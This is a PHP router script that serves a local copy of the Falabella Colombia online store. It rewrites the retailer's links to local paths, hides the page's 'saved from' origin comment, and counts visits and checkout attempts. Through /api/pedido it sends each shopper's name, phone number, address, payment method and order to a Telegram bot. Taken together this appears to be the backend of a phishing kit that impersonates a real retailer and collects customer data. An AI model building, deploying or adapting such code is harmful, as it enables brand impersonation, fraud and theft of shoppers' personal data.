<?php
/**
 * Router para php -S que hace funcionar el clon de Falabella (SPA + tienda local).
 */

// --- Configuración segura (token Telegram no se sube al repo, vive en data/config.php) ---
$_cfgF = __DIR__ . '/data/config.php';
if (is_file($_cfgF)) {
    include $_cfgF;
} else {
    // Fallback en desarrollo: sin token definido, el envío a Telegram queda desactivado
    define('TELEGRAM_BOT_TOKEN', '');
    define('TELEGRAM_CHAT_ID', '');
}

$uri = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);

// 0) JSON del catalogo
if ($uri === '/productos_falabella.json' || $uri === '/falabella-co/productos_falabella.json') {
    $f = __DIR__ . '/productos_falabella.json';
    if (is_file($f)) {
        header('Content-Type: application/json; charset=utf-8');
        header('Content-Length: ' . filesize($f));
        readfile($f);
        return true;
    }
}

// 1) MIME para chunks JS de Next
if (preg_match('/\.(?:js\.descarga|descarga|mjs|js)$/i', $uri)) {
    $archivo = __DIR__ . $uri;
    if (is_file($archivo)) {
        header('Content-Type: application/javascript');
        header('Content-Length: ' . filesize($archivo));
        readfile($archivo);
        return true;
    }
}

// 2) RUTAS SPA INTERNAS (tienda local): /falabella-co/* -> HTML ligero (carga instantánea,
//    sin los scripts bloqueantes de Cloudflare/tracking del index original).
if ($uri !== '/' && $uri !== '/index.html' && strpos($uri, '/falabella-co') === 0 && !preg_match('/\.(css|js|json|png|jpg|jpeg|webp|svg|ico|woff2?|ttf)$/i', $uri)) {
    $archivo = __DIR__ . '/spa-shell.html';
    if (is_file($archivo)) {
        $html = file_get_contents($archivo);
        header('Content-Type: text/html; charset=utf-8');
        header('Content-Length: ' . strlen($html));
        echo $html;
        return true;
    }
}

// 3) HOME raiz -> index.html original (reescrito + shell inyectado)
if ($uri === '/' || $uri === '/index.html') {
    $archivo = __DIR__ . '/index.html';
    if (is_file($archivo)) {
        $html = file_get_contents($archivo);
        $html = construirSPA($html);
        header('Content-Type: text/html; charset=utf-8');
        header('Content-Length: ' . strlen($html));
        echo $html;
        return true;
    }
}

// 4) CSS dinamico inexistente -> 200 vacio
if (preg_match('/\.css$/i', $uri) && !is_file(__DIR__ . $uri)) {
    header('Content-Type: text/css; charset=utf-8');
    header('Content-Length: 0');
    return true;
}

// 5) API: estadísticas (visitas, personas en pago, métodos de pago) + envío a Telegram
$apiStats = @json_decode(@file_get_contents(__DIR__ . '/data/stats.json'), true);
if (!is_array($apiStats)) $apiStats = [];

$method = strtoupper($_SERVER['REQUEST_METHOD'] ?? 'GET');

if ($uri === '/api/stats' && $method === 'GET') {
    header('Content-Type: application/json; charset=utf-8');
    echo json_encode(calcularStats($apiStats), JSON_UNESCAPED_UNICODE);
    return true;
}

if ($uri === '/api/stats/visita' && $method === 'POST') {
    registrarEvento($apiStats, 'visitas');
    header('Content-Type: application/json; charset=utf-8');
    echo json_encode(['ok' => true]);
    return true;
}

if ($uri === '/api/stats/pago-intento' && $method === 'POST') {
    registrarEvento($apiStats, 'pago_intentos');
    header('Content-Type: application/json; charset=utf-8');
    echo json_encode(['ok' => true]);
    return true;
}

if ($uri === '/api/pedido' && $method === 'POST') {
    $body = json_decode(file_get_contents('php://input'), true);
    if (!is_array($body)) $body = [];
    // Métodos de pago enviados hoy (estadística)
    registrarMetodoPago($apiStats, $body['metodo'] ?? 'tarjeta');
    // Notificar al bot de Telegram
    $res = notificarTelegram($body);
    header('Content-Type: application/json; charset=utf-8');
    echo json_encode(['ok' => true, 'telegram' => $res]);
    return true;
}

// 6) Resto -> servir tal cual
return false;

/* ============================================================
   TELEGRAM BOT (fallansacmbot) + ESTADÍSTICAS DIARIAS
   ============================================================ */

/**
 * Obtiene fecha local (America/Bogota) en formato YYYY-MM-DD.
 */
function fechaHoy() {
    $tz = new DateTimeZone('America/Bogota');
    return (new DateTime('now', $tz))->format('Y-m-d');
}

/**
 * Guarda el array de stats en disco.
 */
function guardarStats($stats) {
    $dir = __DIR__ . '/data';
    if (!is_dir($dir)) @mkdir($dir, 0775, true);
    @file_put_contents(__DIR__ . '/data/stats.json', json_encode($stats, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));
}

/**
 * Registra un evento contador para el día de hoy.
 */
function registrarEvento(&$stats, $clave) {
    $hoy = fechaHoy();
    if (!isset($stats['dias'][$hoy])) $stats['dias'][$hoy] = ['visitas' => 0, 'pago_intentos' => 0, 'metodos' => []];
    $stats['dias'][$hoy][$clave] = ($stats['dias'][$hoy][$clave] ?? 0) + 1;
    guardarStats($stats);
}

/**
 * Registra un método de pago usado hoy.
 */
function registrarMetodoPago(&$stats, $metodo) {
    $hoy = fechaHoy();
    if (!isset($stats['dias'][$hoy])) $stats['dias'][$hoy] = ['visitas' => 0, 'pago_intentos' => 0, 'metodos' => []];
    $m = strtolower(trim((string)$metodo));
    if ($m === '') $m = 'tarjeta';
    $stats['dias'][$hoy]['metodos'][$m] = ($stats['dias'][$hoy]['metodos'][$m] ?? 0) + 1;
    guardarStats($stats);
}

/**
 * Calcula los totales de hoy (para el endpoint /api/stats).
 */
function calcularStats($stats) {
    $hoy = fechaHoy();
    $d = $stats['dias'][$hoy] ?? ['visitas' => 0, 'pago_intentos' => 0, 'metodos' => []];
    return [
        'fecha'            => $hoy,
        'visitas_hoy'      => $d['visitas'] ?? 0,
        'pago_intentos'    => $d['pago_intentos'] ?? 0,
        'metodos_hoy'      => $d['metodos'] ?? [],
        'total_pedidos_hoy'=> array_sum($d['metodos'] ?? []),
    ];
}

/**
 * Obtiene (o crea) el chat_id al que enviar. Reutiliza el guardado.
 */
function obtenerChatId() {
    // 1) chat_id fijo si está configurado
    if (defined('TELEGRAM_CHAT_ID') && trim(TELEGRAM_CHAT_ID) !== '') return TELEGRAM_CHAT_ID;
    // 2) chat_id guardado previamente
    $f = __DIR__ . '/data/telegram_chat.json';
    if (is_file($f)) {
        $c = json_decode(file_get_contents($f), true);
        if (!empty($c['chat_id'])) return $c['chat_id'];
    }
    // 3) Si no hay chat_id, pregunta a getUpdates (primer chat disponible).
    if (TELEGRAM_BOT_TOKEN === '') return null;
    $upd = @file_get_contents('https://api.telegram.org/bot' . TELEGRAM_BOT_TOKEN . '/getUpdates');
    $j = json_decode($upd, true);
    if (isset($j['result']) && is_array($j['result'])) {
        foreach ($j['result'] as $u) {
            if (isset($u['message']['chat']['id'])) {
                $cid = $u['message']['chat']['id'];
                $dir = __DIR__ . '/data';
                if (!is_dir($dir)) @mkdir($dir, 0775, true);
                @file_put_contents($f, json_encode(['chat_id' => $cid]));
                return $cid;
            }
        }
    }
    return null;
}

/**
 * Envía un mensaje formateado con los datos del pedido al bot de Telegram.
 * @return array ['ok'=>bool, 'desc'=>string]
 */
function notificarTelegram($datos) {
    $chatId = obtenerChatId();
    $nombre = trim($datos['nombre'] ?? '');
    $tel    = trim($datos['telefono'] ?? '');
    $dir    = trim($datos['direccion'] ?? '');
    $metodo = trim($datos['metodo'] ?? 'tarjeta');
    $total  = number_format((float)($datos['total'] ?? 0), 0, ',', '.');
    $productos = $datos['productos'] ?? [];
    if (is_string($productos)) $productos = [$productos];

    $lista = '';
    if (is_array($productos)) {
        foreach ($productos as $i => $p) {
            if (is_array($p)) {
                $n = $p['nombre'] ?? ('Producto ' . ($i + 1));
                $c = $p['cant'] ?? 1;
                $pr = number_format((float)($p['precio'] ?? 0), 0, ',', '.');
                $lista .= ($i + 1) . ". " . $n . " x" . $c . " — $" . $pr . "\n";
            } else {
                $lista .= ($i + 1) . ". " . $p . "\n";
            }
        }
    }
    if ($lista === '') $lista = '(sin detalle)';

    $metodoLbl = [
        'tarjeta' => 'Tarjeta 💳',
        'pse'     => 'PSE 🏦',
        'contra'  => 'Contra entrega 📦',
    ][strtolower($metodo)] ?? ucfirst($metodo);

    $fecha = (new DateTime('now', new DateTimeZone('America/Bogota')))->format('d/m/Y H:i');

    $msg = "🛒 *NUEVO PEDIDO*\n"
         . "─────────────\n"
         . "👤 *Cliente:* " . $nombre . "\n"
         . "📞 *Teléfono:* " . $tel . "\n"
         . (!empty($dir) ? "📍 *Dirección:* " . $dir . "\n" : '')
         . "💳 *Método:* " . $metodoLbl . "\n"
         . "💰 *Total:* $" . $total . "\n\n"
         . "🛍️ *Productos:*\n" . $lista . "\n"
         . "🕒 " . $fecha;

    if (!$chatId) {
        return ['ok' => false, 'desc' => 'Sin chat_id de Telegram. Escribe al bot @fallansacmbot primero.'];
    }
    if (TELEGRAM_BOT_TOKEN === '') {
        return ['ok' => false, 'desc' => 'Token de Telegram no configurado (falta data/config.php).'];
    }

    $url = 'https://api.telegram.org/bot' . TELEGRAM_BOT_TOKEN . '/sendMessage';
    $data = [
        'chat_id' => $chatId,
        'text'    => $msg,
        'parse_mode' => 'Markdown',
        'disable_web_page_preview' => true,
    ];
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => http_build_query($data),
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 10,
    ]);
    $resp = curl_exec($ch);
    $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    $j = json_decode($resp, true);
    return ['ok' => is_array($j) && ($j['ok'] ?? false), 'desc' => 'HTTP ' . $code];
}


/**
 * Reescribe links de Falabella a rutas locales y agrega el shell de la tienda.
 */
function construirSPA($html) {
    // === REWRITE GLOBAL SEGURO ===
    // Reemplaza TODAS las ocurrencias del dominio del sitio (en href, src, action, y dentro
    // de los datos serializados de React/Next en <script>) por rutas locales.
    // https://www.falabella.com.co/falabella-co/X  ->  /falabella-co/X
    // Solo cambia el contenido del string URL, no la sintaxis JSON/JS, por lo que es seguro.
    $html = str_replace(
        'https://www.falabella.com.co/falabella-co',
        '/falabella-co',
        $html
    );
    // Formas sin www y http (variantes)
    $html = str_replace(
        'https://www.falabella.com.co/falabella-co/',
        '/falabella-co/',
        $html
    );
    $html = str_replace(
        'http://www.falabella.com.co/falabella-co',
        '/falabella-co',
        $html
    );
    $html = str_replace(
        'www.falabella.com.co/falabella-co',
        '/falabella-co',
        $html
    );

    // Limpieza de metadatos/comentarios de origen guardado
    $html = str_replace(
        '<!-- saved from url=(0041)https://www.falabella.com.co/falabella-co -->',
        '<!-- clon local Falabella -->',
        $html
    );
    $html = preg_replace(
        '#content="https?://www\.falabella\.com\.co/falabella-co([^"]*)"#',
        'content="/falabella-co$1"',
        $html
    );

    // d) Cargar el shell de la tienda justo antes de </body>
    $shell = @file_get_contents(__DIR__ . '/app-shell.html');
    if ($shell !== false) {
        $html = str_replace('</body>', $shell . "\n</body>", $html);
    }

    return $html;
}
